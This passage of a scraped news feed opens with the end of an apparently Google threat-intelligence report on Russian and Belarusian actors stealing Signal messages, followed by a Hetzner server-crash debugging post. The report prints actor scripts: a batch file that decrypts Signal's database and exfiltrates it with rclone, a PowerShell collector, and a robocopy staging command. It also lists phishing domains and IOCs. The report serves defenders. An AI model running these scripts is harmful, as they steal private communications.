</ul></span></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-signal.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig4-signal.max-1200x1200.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 4: Malicious device-linking QR code hosted on UNC4221-controlled domain "signal-confirm[.]site"</p></span></p></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig5-signal.max-1200x1200.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 5: UNC4221 phishing page mimicking the networking component of Kropyva hosted at "teneta.add-group[.]site". The page invites the user to "Sign in to Signal" (Ukrainian: "Авторизуватись у Signal"), which in turn displays a QR code linked to an UNC4221-controlled Signal instance.</p></span></p></section><section><figure><section jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img src="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/fig6-signal.max-1400x1400.png" jsname="P3Vluc" jsaction="click:HTIlC" loading="lazy"></section></figure><p><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p>Figure 6: Phishing page crafted to appear as a Signal security alert hosted on UNC4221-controlled domain signal-protect[.]host</p></span></p></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p><span>Notably, as a core component of its Signal targeting, UNC4221 has also used a lightweight JavaScript payload tracked as PINPOINT to collect basic user information and geolocation data using the browser's GeoLocation API. In general, we expect to see secure messages and location data to frequently feature as joint targets in future operations of this nature, particularly in the context of targeted surveillance operations or support to conventional military operations.</span></p>
<h2><span>Wider Russian and Belarusian Efforts to Steal Messages From Signal</span></h2>
<p><span>Beyond targeted efforts to link additional actor-controlled devices to victim Signal accounts, multiple known and established regional threat actors have also been observed operating capabilities designed to steal Signal database files from Android and Windows devices.</span></p>
<ul>
<li>
<p><span>APT44 has been observed operating WAVESIGN, a lightweight Windows Batch script, to periodically query Signal messages from a victim's Signal database and exfiltrate those most recent messages using Rclone (Figure 7).</span></p>
</li>
<li>
<p><span>As reported in 2023 by the </span><a href="https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system" rel="noopener" target="_blank"><span>Security Service of Ukraine</span></a><span> (SSU) and the UK's </span><a href="https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/infamous-chisel/NCSC-MAR-Infamous-Chisel.pdf" rel="noopener" target="_blank"><span>National Cyber Security Centre</span></a><span> (NCSC), the Android malware tracked as Infamous Chisel and attributed by the respective organizations to Sandworm, is designed to recursively search for a list of file extensions including the local database for a series of messaging applications, including Signal, on Android devices.</span></p>
</li>
<li>
<p><span>Turla, a Russian threat actor attributed by the </span><a href="https://www.justice.gov/opa/pr/justice-department-announces-court-authorized-disruption-snake-malware-network-controlled" rel="noopener" target="_blank"><span>United States</span></a><span> and </span><a href="https://www.gov.uk/government/publications/russias-fsb-malign-cyber-activity-factsheet/russias-fsb-malign-activity-factsheet" rel="noopener" target="_blank"><span>United Kingdom</span></a><span> to Center 16 of the Federal Security Service (FSB) of the Russian Federation, has also operated a lightweight PowerShell script in post-compromise contexts to stage Signal Desktop messages for exfiltration (Figure 8).</span></p>
</li>
<li>
<p><span>Extending beyond Russia, Belarus-linked UNC1151 has used the command-line utility Robocopy to stage the contents of file directories used by Signal Desktop to store messages and attachments for later exfiltration (Figure 9).</span></p>
</li>
</ul></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>if %proflag%==1 (
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";" ".recover" &gt; NUL
    copy /y %new% C:\ProgramData\Signal\Storage\Signal\sqlorig\db.sqlite
    C:\ProgramData\Signal\Storage\rc.exe copy -P -I --log-file=C:\ProgramData\Signal\Storage\rclog.txt --log-level INFO C:\ProgramData\Signal\Storage\Signal\sqlorig si:SignalFresh/sqlorig
    del C:\ProgramData\Signal\Storage\Signal\log*
    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql
) ELSE (

    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% "PRAGMA key=""x'%key%'"";" ".recover" &gt; NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %old% "PRAGMA key=""x'%key%'"";select count(*) from sqlite_master;ATTACH DATABASE '%old_dec%' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;"
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";" ".recover" &gt; NUL
    C:\ProgramData\Signal\Storage\sqlcipher.exe %new% "PRAGMA key=""x'%key%'"";select count(*) from sqlite_master;ATTACH DATABASE '%new_dec%' AS plaintext KEY '';SELECT sqlcipher_export('plaintext');DETACH DATABASE plaintext;"
    C:\ProgramData\Signal\Storage\sqldiff.exe --primarykey --vtab %old_dec% %new_dec% &gt; %diff_name%
    del /s %old_dec% %new_dec%

    rmdir /s /q C:\ProgramData\Signal\Storage\sql
    move C:\ProgramData\Signal\Storage\Signal\sql C:\ProgramData\Signal\Storage\sql

    powershell -Command "move C:\ProgramData\Signal\Storage\log.tmp C:\ProgramData\Signal\Storage\Signal\log$(Get-Date -f """ddMMyyyyHHmmss""").tmp"
)</code></pre>
<p><span><span>Figure 7:</span><strong> </strong><span>Code snippet from WAVESIGN used by APT44 to exfiltrate Signal messages</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>$TempPath = $env:tmp
$TempPath = $env:temp

$ComputerName = $env:computername
$DFSRoot = "\\redacted"
$RRoot = $DFSRoot + "resource\"

$frand = Get-Random -Minimum 1 -Maximum 10000

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append

Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\config.json" | Out-File $treslocal -Append
Get-ChildItem "C:\Users\..\AppData\Roaming\SIGNAL\sql\db.sqlite" | Out-File $treslocal -Append


$file1 = $ComputerName + "_" + $frand + "sig.zip"
$zipfile = $TempPath + "\" + $file1
$resfile = $RRoot + $file1
Compress-Archive -Path "C:\Users\..\AppData\Roaming\SIGNAL\config.json" -DestinationPath $zipfile
Copy-Item -Path $zipfile -Destination $resfile -Force
Remove-Item -Path $zipfile -Force</code></pre>
<p><span><span>Figure 8:</span><strong> </strong><span>PowerShell script used by Turla to exfiltrate Signal messages</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><pre><code>C:\Windows\system32\cmd.exe /C cd %appdata% &amp;&amp; robocopy 
"%userprofile%\AppData\Roaming\Signal" C:\Users\Public\data\signa /S</code></pre>
<p><span><span>Figure 9:</span><strong> </strong><span>Robocopy command used by UNC1151 to stage Signal file directories for exfiltration</span></span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>Outlook and Implications</span></h2>
<p><span>The operational emphasis on Signal from multiple threat actors in recent months serves as an important warning for the growing threat to secure messaging applications that is certain to intensify in the near-term. When placed in a wider context with other trends in the threat landscape, such as the growing commercial spyware industry and the surge of mobile malware variants being leveraged in active conflict zones, there appears to be a clear and growing demand for offensive cyber capabilities that can be used to monitor the sensitive communications of individuals who rely on secure messaging applications to safeguard their online activity.</span></p>
<p><span>As reflected in wide ranging efforts to compromise Signal accounts, this threat to secure messaging applications is not limited to remote cyber operations such as phishing and malware delivery, but also critically includes close-access operations where a threat actor can secure brief access to a target's unlocked device. Equally important, this threat is not only limited to Signal, but also extends to other widely used messaging platforms, including WhatsApp and Telegram, which have likewise factored into the targeting priorities of several of the aforementioned Russia-aligned groups in recent months. For an example of this wider targeting interest, see Microsoft Threat Intelligence's </span><a href="https://www.microsoft.com/en-us/security/blog/2025/01/16/new-star-blizzard-spear-phishing-campaign-targets-whatsapp-accounts/" rel="noopener" target="_blank"><span>recent blog post</span></a><span> on a COLDRIVER (aka UNC4057 and Star Blizzard) campaign attempting to abuse the linked device feature to compromise WhatsApp accounts.&nbsp;&nbsp;</span></p>
<p><span>Potential targets of government-backed intrusion activity targeting their personal devices should adopt practices to help safeguard themselves, including:</span></p>
<ul>
<li>
<p><span>Enable </span><a href="https://support.google.com/android/answer/9079129?hl=en" rel="noopener" target="_blank"><span>screen lock</span></a><span> on all mobile devices using a long, complex password with a mix of uppercase and lowercase letters, numbers, and symbols. Android supports alphanumeric passwords, which offer significantly more security than numeric-only PINs or patterns.</span></p>
</li>
<li>
<p><span>Install operating system updates as soon as possible and always use the latest version of Signal and other messaging apps.</span></p>
</li>
<li>
<p><span>Ensure </span><a href="https://support.google.com/googleplay/answer/2812853?hl=en" rel="noopener" target="_blank"><span>Google Play Protect</span></a><span> is enabled, which is on by default on Android devices with Google Play Services. Google Play Protect checks your apps and devices for harmful behavior and can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.</span></p>
</li>
<li>
<p><span>Audit linked devices regularly for unauthorized devices by navigating to the "Linked devices" section in the application's settings.</span></p>
</li>
<li>
<p><span>Exercise caution when interacting with QR codes and web resources purporting to be software updates, group invites, or other notifications that appear legitimate and urge immediate action.</span></p>
</li>
<li>
<p><span>If available, use two-factor authentication such as fingerprint, facial recognition, a security key, or a one-time code to verify when your account is logged into or linked to a new device.</span></p>
</li>
<li>
<p><span>iPhone users concerned about targeted surveillance or espionage activity should consider enabling </span><a href="https://support.apple.com/en-ca/guide/iphone/iph049680987/ios" rel="noopener" target="_blank"><span>Lockdown Mode</span></a><span> to reduce their attack surface.</span></p>
</li>
</ul></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><h2><span>Indicators of Compromise</span></h2>
<p><span>To assist organizations hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a <a href="https://www.virustotal.com/gui/collection/b9885b58701486f26d370ea939aaffc263d5c4053696bfe82911247ef43da85a" rel="noopener" target="_blank">GTI Collection</a> for registered users.</span></p>
<p><span>See Table 1 for a sample of relevant indicators of compromise.</span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><div>
<div><table><colgroup><col><col><col></colgroup>
<tbody>
<tr>
<td>
<p><strong>Actor</strong></p>
</td>
<td>
<p><strong>Indicator of Compromise</strong></p>
</td>
<td>
<p><strong>Context&nbsp;</strong></p>
</td>
</tr>
<tr>
<td rowspan="9">
<p><span>UNC5792</span></p>
</td>
<td>
<p><span>e078778b62796bab2d7ab2b04d6b01bf</span></p>
</td>
<td>
<p><span>Example of altered group invite HTML code&nbsp;</span></p>
</td>
</tr>
<tr>
<td rowspan="8">
<p><span>add-signal-group[.]com</span></p>
<p><span>add-signal-groups[.]com</span></p>
<p><span>group-signal[.]com</span></p>
<p><span>groups-signal[.]site</span></p>
<p><span>signal-device-off[.]online</span></p>
<p><span>signal-group-add[.]com</span></p>
<p><span>signal-group[.]site</span></p>
<p><span>signal-group[.]tech</span></p>
<p><span>signal-groups-add[.]com</span></p>
<p><span>signal-groups[.]site</span></p>
<p><span>signal-groups[.]tech</span></p>
<p><span>signal-security[.]online</span></p>
<p><span>signal-security[.]site</span></p>
<p><span>signalgroup[.]site</span></p>
<p><span>signals-group[.]com</span></p>
</td>
<td rowspan="8">
<p><span>Fake group invite phishing pages</span></p>
</td>
</tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr></tr>
<tr>
<td rowspan="5">
<p><span>UNC4221</span></p>
</td>
<td rowspan="2">
<p><span>signal-confirm[.]site</span></p>
<p><span>confirm-signal[.]site</span></p>
</td>
<td rowspan="2">
<p><span>Device-linking instructions phishing page</span></p>
</td>
</tr>
<tr></tr>
<tr>
<td>
<p><span>signal-protect[.]host</span></p>
</td>
<td>
<p><span>Fake Signal security alert&nbsp;</span></p>
</td>
</tr>
<tr>
<td rowspan="2">
<p><span>teneta.join-group[.]online</span></p>
<p><span>teneta.add-group[.]site</span></p>
<p><span>group-teneta[.]online</span></p>
<p><span>helperanalytics[.]ru</span></p>
<p><span>group-teneta[.]online</span></p>
<p><span>teneta[.]group</span></p>
<p><span>group.kropyva[.]site</span></p>
</td>
<td rowspan="2">
<p><span>Fake Kropyva group invites&nbsp;</span></p>
</td>
</tr>
<tr></tr>
<tr>
<td rowspan="4">
<p><span>APT44</span></p>
</td>
<td>
<p><span>150.107.31[.]194:18000</span></p>
</td>
<td>
<p><span>Dynamically generated device-linking QR code provisioned by APT44</span></p>
</td>
</tr>
<tr>
<td rowspan="3">
<p><span>a97a28276e4f88134561d938f60db495</span></p>
<p><span>b379d8f583112cad3cf60f95ab3a67fd</span></p>
<p><span>b27ff24870d93d651ee1d8e06276fa98</span></p>
</td>
<td rowspan="3">
<p><span>WAVESIGN batch scripts&nbsp;</span></p>
</td>
</tr>
<tr></tr>
<tr></tr>
</tbody>
</table></div>
<p><span><span>Table 1: Relevant indicators of compromise</span></span></p></div></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><p><span>See Table 2 for a summary of the different actors, tactics, and techniques used by Russia and Belarus state-aligned threat actors to target Signal messages.</span></p></span></section><section><span jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip="" ssk="5:kbe95"><div><table><colgroup><col><col><col></colgroup>
<tbody>
<tr>
<td>
<p><strong>Threat Actor&nbsp;</strong></p>
</td>
<td>
<p><strong>Tactic&nbsp;</strong></p>
</td>
<td>
<p><strong>Technique</strong></p>
</td>
</tr>
<tr>
<td>
<p><span>UNC5792</span></p>
</td>
<td>
<p><span>Linked device</span></p>
</td>
<td>
<p><span>Remote phishing operations using fake group invites to pair a victim's Signal messages to an actor-controlled device</span></p>
</td>
</tr>
<tr>
<td>
<p><span>UNC4221</span></p>
</td>
<td>
<p><span>Linked device</span></p>
</td>
<td>
<p><span>Remote phishing operations using fake military web applications and security alerts to pair a victim's Signal messages to an actor-controlled device</span></p>
</td>
</tr>
<tr>
<td rowspan="3">
<p><span>APT44</span></p>
</td>
<td>
<p><span>Linked device</span></p>
</td>
<td>
<p><span>Close-access physical device exploitation to pair a victim's Signal messages to an actor-controlled device</span></p>
</td>
</tr>
<tr>
<td>
<p><span>Signal Android database theft</span></p>
</td>
<td>
<p><span>Android malware (</span><a href="https://ssu.gov.ua/en/novyny/sbu-exposes-russian-intelligence-attempts-to-penetrate-armed-forces-planning-operations-system" rel="noopener" target="_blank"><span>Infamous Chisel</span></a><span>) tailored to exfiltrate Signal database files</span></p>
</td>
</tr>
<tr>
<td>
<p><span>Signal Desktop database theft&nbsp;</span></p>
</td>
<td>
<p><span>Windows Batch script tailored to periodically exfiltrate recent Signal messages via Rclone</span></p>
</td>
</tr>
<tr>
<td>
<p><span>Turla</span></p>
</td>
<td>
<p><span>Signal Desktop database theft&nbsp;</span></p>
</td>
<td>
<p><span>Post-compromise activity in Windows environments</span></p>
</td>
</tr>
<tr>
<td>
<p><span>UNC1151</span></p>
</td>
<td>
<p><span>Signal Desktop database theft&nbsp;</span></p>
</td>
<td>
<p><span>Use of Robocopy to stage Signal Desktop file directories for exfiltration</span></p>
</td>
</tr>
</tbody>
</table></div>
<p><span>Table 2: Summary of observed threat activity targeting Signal messages</span></p></span></section><section><span>Posted in</span><ul><li><a href="https://cloud.google.com/blog/topics/threat-intelligence" track-metadata-position="body" track-metadata-eventdetail="cloud.google.com/blog/topics/threat-intelligence" track-metadata-module="tag list" track-metadata-module_headline="posted in">Threat Intelligence</a></li></ul></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Doge Claimed It Saved $8B in One Contract. It Was $8M (185 pts)]]></title>
            <link>https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html</link>
            <guid>43101757</guid>
            <pubDate>Wed, 19 Feb 2025 13:12:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html">https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html</a>, See on <a href="https://news.ycombinator.com/item?id=43101757">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2025/02/18/upshot/doge-contracts-musk-trump.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Debugging Hetzner: Uncovering failures with powerstat, sensors, and dmidecode (273 pts)]]></title>
            <link>https://www.ubicloud.com/blog/debugging-hetzner-uncovering-failures-with-powerstat-sensors-and-dmidecode</link>
            <guid>43101430</guid>
            <pubDate>Wed, 19 Feb 2025 12:40:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ubicloud.com/blog/debugging-hetzner-uncovering-failures-with-powerstat-sensors-and-dmidecode">https://www.ubicloud.com/blog/debugging-hetzner-uncovering-failures-with-powerstat-sensors-and-dmidecode</a>, See on <a href="https://news.ycombinator.com/item?id=43101430">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" data-doc-height="1" role="banner"><div><p>EuroGPT Enterprise is open source, runs in Europe, and keeps your data private. <a href="https://www.ubicloud.com/use-cases/eurogpt-enterprise">Try it now</a></p></div><div><p><a href="https://www.ubicloud.com/"><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/64fe48116c52fe1a51e17279_ubicolud%20logo.png" loading="lazy" alt=""></a></p></div></div><div id="w-node-decdb48f-56e8-4c35-c577-932285e9b439-0c072a00"><p>February 17, 2025 · 5 min read</p><div><p><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/669a6467d686c690fa7e7ac6_Burak.jpg" loading="lazy" sizes="40px" srcset="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/669a6467d686c690fa7e7ac6_Burak-p-500.jpg 500w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/669a6467d686c690fa7e7ac6_Burak.jpg 512w" alt="Burak Yucesoy"></p><div><p>Burak Yucesoy</p><p>Principal Software Engineer</p></div></div><div><p>At Ubicloud, we build software that turns bare metal providers into cloud platforms. One of the providers we like is Hetzner because of their affordable and reliable servers.</p><p>About a year ago, Hetzner launched the AX162 server line. It offers better performance and a lower price than its predecessor, AX161. We were very excited to adopt it, but we soon encountered serious reliability issues. We observed that the new servers were 16 times more likely to crash. After months of debugging and working with Hetzner, the solution only came after several hardware updates. Although the journey was painful, we learned a lot from it and wanted to share our experience.</p></div><div id="some-terminology"><h3>What Happened?</h3><div><p>Three weeks after purchasing our first AX162 server, one of the servers crashed. We checked the system logs and found NULL bytes. These usually mean there was an abrupt failure, like a power loss, which stopped the system from finishing its writing process. Hetzner performed a hardware check but found nothing unusual. A week later, we experienced another crash, followed by several more over the next few days.</p><p>In the days that followed, the crash frequency increased. For each crash, Hetzner checked the hardware. Sometimes, they found a defect and replaced the server. Other times, they found nothing unusual. We contacted Hetzner about the frequent crashes, but it was hard to find a clear cause.</p><p>At this point, we observed a few interesting patterns:</p></div><ul role="list"><li>All crashes occurred on AX162 servers.</li><li><p>There were two types of crashes:</p><ul role="list"><li>The server comes back online after a manual restart.</li><li>The server wouldn't respond to restart requests or diagnostic codes sent by Hetzner engineers. Hetzner would replace the server in these cases.</li></ul></li><li>The servers usually run smoothly for an extended period. However, once a server experiences its first crash, further crashes become more likely. After the server experiences the first type of crash several times, it would eventually have the second type of crash and be replaced.</li></ul></div><div><h3 id="Red-Hat-Reference-Architecture">Initial Investigations</h3><p>We started testing different ideas to find out what caused the crashes.</p><div><h4>System Load</h4><p>We considered the possibility of increased load on the machine causing issues. The AX162 machines come with 96 vCPUs, and we had workloads that utilized all of them at the same time. Consistent high load, for example, could lead to increased temperatures and unexpected issues. However, when we reviewed the load levels at the times of crashes, we found several instances where crashes occurred even under low or no load.</p></div><div><h4>Temperature</h4><p>We wanted to check if there is a correlation between high temperatures and crashes. It is possible to collect the temperature of various components in the system with sensors command.</p><div><pre><code>$&gt; sensors
coretemp-isa-0000
Adapter: ISA adapter
Package id 0:  +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 0:        +45.0°C  (high = +100.0°C, crit = +100.0°C)
Core 4:        +46.0°C  (high = +100.0°C, crit = +100.0°C)
Core 8:        +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 9:        +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 10:       +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 11:       +51.0°C  (high = +100.0°C, crit = +100.0°C)
Core 12:       +49.0°C  (high = +100.0°C, crit = +100.0°C)
Core 13:       +49.0°C  (high = +100.0°C, crit = +100.0°C)
Core 14:       +49.0°C  (high = +100.0°C, crit = +100.0°C)
Core 15:       +49.0°C  (high = +100.0°C, crit = +100.0°C)</code></pre></div><p>We wrote a simple cron job to collect temperature data. When the servers crashed again, we checked the data. The temperature levels were not significantly higher than average at the time of the crashes.</p></div><div><h4>Faulty Components</h4><p>Commands like <span>lshw</span> and <span>dmidecode</span> are useful to gather information regarding hardware parts, including model and serial numbers.</p><div><pre><code>$&gt; dmidecode -t 2
# dmidecode 3.3
Getting SMBIOS data from sysfs.
SMBIOS 3.3.0 present.
Handle 0x0200, DMI type 2, 8 bytes
Base Board Information
        Manufacturer: Dell Inc.
        Product Name: 0H3K7P
        Version: A08
        Serial Number: .51R1H04.MXWSJ0039D004Z.</code></pre></div><p>We compared the components of AX162 servers that had crashed with those that hadn’t. We found no significant differences. We even checked how serial numbers increase, because we thought older components might fail more often. But crashes happened even in servers with the latest serial numbers.</p></div><div><h4>Power Consumption</h4><div><p>Power, rather than space, often limits data center expansion. To increase the number of machines under power constraints, data center operators usually cap power use per machine. However, this can cause motherboards to degrade more quickly. Although we didn’t know if Hetzner was limiting power consumption, the symptoms suggested this might be a factor. Repeated server crashes after a long period of stability usually mean the hardware is wearing out. We also eliminated all other hypotheses we had one by one, which only left power limiting as a strong hypothesis.</p><p>With the <span>powerstat</span> tool, we measured the maximum power consumption over a long period.</p></div><div><pre><code>$&gt; powerstat -R
  Time   User Nice  Sys  Idle   IO Run Ctxt/s  IRQ/s Fork Exec Exit  Watts
14:17:15  3.1  0.0  0.0  96.9  0.0   5    430   1593    0    0    0 166.54 
14:17:16  3.1  0.0  0.0  96.9  0.0   5    425   1638    1    1    1 166.51 
14:17:17  3.1  0.0  0.0  96.9  0.0   5    570   1737    0    0    0 166.50 
14:17:18  3.1  0.0  0.0  96.9  0.0   5    609   1787    0    0    0 166.48 
14:17:19  3.1  0.0  0.0  96.9  0.0   5    469   1662    0    0    0 166.49 
...
</code></pre></div><p>We then compared our measurements with the advertised amounts.</p><div><table><thead><tr><th>Model</th><th>Advertised Max. Power Consumption (Watt)</th><th>Measured Max. Power Consumption (Watt)</th></tr></thead><tbody><tr><td>AX161</td><td><p>147 (<a href="https://web.archive.org/web/20240223142827/https://www.hetzner.com/dedicated-rootserver/matrix-ax/" target="_blank">1</a>)</p></td><td>168</td></tr><tr><td>AX162</td><td><p>408 (<a href="https://web.archive.org/web/20240228172003/https://www.hetzner.com/dedicated-rootserver/matrix-ax/" target="_blank">2</a>)</p></td><td>266</td></tr><tr></tr></tbody></table></div><p>Based on these numbers, we suspected that Hetzner might indeed be limiting power usage.</p></div><div><h4>Data Collection on Crash Rates and Comparison</h4><p>Although we were observing an increased crash rate, we wanted to support this observation with data. A common way to measure hardware reliability is the Annualized Failure Rate (AFR). It's like the annual run rate, but for component failures. The formula for AFR is:</p><p><img src="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR.png" loading="lazy" sizes="(max-width: 479px) 93vw, (max-width: 767px) 97vw, (max-width: 991px) 94vw, (max-width: 1439px) 58vw, 748.703125px" srcset="https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR-p-500.png 500w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR-p-800.png 800w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR-p-1080.png 1080w, https://cdn.prod.website-files.com/64f9d9b4e737e7b37d4e39a4/67ab440611daa766d7af72f7_AFR.png 1186w" alt="afr calculation"></p><p>AFR has its own limitations, but it is simple enough to give us a starting point, so we decided to use it. Here are our initial measurements:</p><div><table><thead><tr><th>Model</th><th>Total Failure Count</th><th>Total Days in Service</th><th>Annual Failure Rate</th></tr></thead><tbody><tr><td>AX161</td><td><p>11</p></td><td>3784</td><td>1.06</td></tr><tr><td>AX162</td><td><p>34</p></td><td>737</td><td>16.84</td></tr><tr></tr></tbody></table></div><p>Our observations indicated that AX162 servers are 16 times more likely to experience a failure compared to other models. The data also backed up our first finding: after a server crashes once, it is very likely to crash again. In fact, 80% of servers that crashed once had a second crash within 24 hours</p></div></div><div id="aws-firecracker"><h3>Observing Stability with New Hardware</h3><div><p>We submitted a detailed support ticket with the additional data on power limiting and annualized failure rates. Hetzner didn’t confirm or deny the possibility of power limiting but informed us that they had identified a defect in a batch of motherboards. They had recently received a new batch and recommended replacing the motherboards in our affected servers. Normally, replacing a big part of our fleet can disrupt customer workloads. However, we had already moved most critical tasks from the AX162 servers because they kept crashing, so replacing them was manageable.</p><p>We replaced the motherboards but kept critical workloads off the AX162 servers. We weren't sure the issue was fully resolved. Based on prior experience, we knew that servers appearing stable could still begin to crash frequently even after a month. Thus, we decided to monitor them carefully over an extended period.</p><p>At first, we saw no crashes. Then, after two weeks, servers with the new motherboards started crashing as well.</p></div><div><table><thead><tr><th>Model</th><th>Total Failure Count</th><th>Total Days in Service</th><th>Annual Failure Rate</th></tr></thead><tbody><tr><td>AX161</td><td><p>11</p></td><td>3784</td><td>1.06</td></tr><tr><td>AX162</td><td><p>34</p></td><td>737</td><td>16.84</td></tr><tr><td>AX162 -v2</td><td><p>11</p></td><td>758</td><td>5.30</td></tr></tbody></table></div><div><p>AX162 servers with new motherboards crashed less frequently, but the crash rate was still high. After contacting Hetzner again, we learned of an even newer version of the motherboard with improved reliability. We migrated our servers to this latest version and began monitoring reliability.</p><p>After monitoring the new servers for several months, we concluded that the crash issue is indeed resolved. Additionally, the AFR of these servers is now even better than that of the AX161 servers.</p></div><div><table><thead><tr><th>Model</th><th>Total Failure Count</th><th>Total Days in Service</th><th>Annual Failure Rate</th></tr></thead><tbody><tr><td>AX161</td><td><p>11</p></td><td>3784</td><td>1.06</td></tr><tr><td>AX162</td><td><p>34</p></td><td>737</td><td>16.84</td></tr><tr><td>AX162 -v2</td><td><p>11</p></td><td>758</td><td>5.30</td></tr><tr><td>AX162 -v3</td><td><p>4</p></td><td>3738</td><td>0.39</td></tr></tbody></table></div></div><div id="ubicloud-compute"><h3>Process Improvements</h3><p>Adopting a new line of servers early on can come with unforeseen issues. We were quick to adopt the new servers because their specs were exciting. Also Hetzner’s decision to discontinue the AX161 model suggested the new line was production-ready. Looking back, waiting six months could have helped us avoid many issues. Early adopters usually find problems that get fixed later. Moving forward, we will make the following changes:</p><ul role="list"><li>We will conduct a thorough vetting of future server models.</li><li>We will introduce new hardware gradually, beginning with non-critical workloads.</li><li>We will add more bare metal providers to distribute the risk. In fact, we already support two more bare metal providers; Leaseweb and Latitude. We are also working on adding the fourth one.</li></ul><p>We hope our lessons offer valuable insights to others navigating similar issues. As we develop a solid, open-source alternative to traditional cloud providers, these experiences motivate us to keep improving. We aim to deliver cloud solutions that are both reliable and adaptable.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Broken Legs and Ankles Heal Better If You Walk on Them Within Weeks (304 pts)]]></title>
            <link>https://www.scientificamerican.com/article/broken-legs-and-ankles-heal-better-if-you-walk-on-them-within-weeks/</link>
            <guid>43101383</guid>
            <pubDate>Wed, 19 Feb 2025 12:36:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.scientificamerican.com/article/broken-legs-and-ankles-heal-better-if-you-walk-on-them-within-weeks/">https://www.scientificamerican.com/article/broken-legs-and-ankles-heal-better-if-you-walk-on-them-within-weeks/</a>, See on <a href="https://news.ycombinator.com/item?id=43101383">Hacker News</a></p>
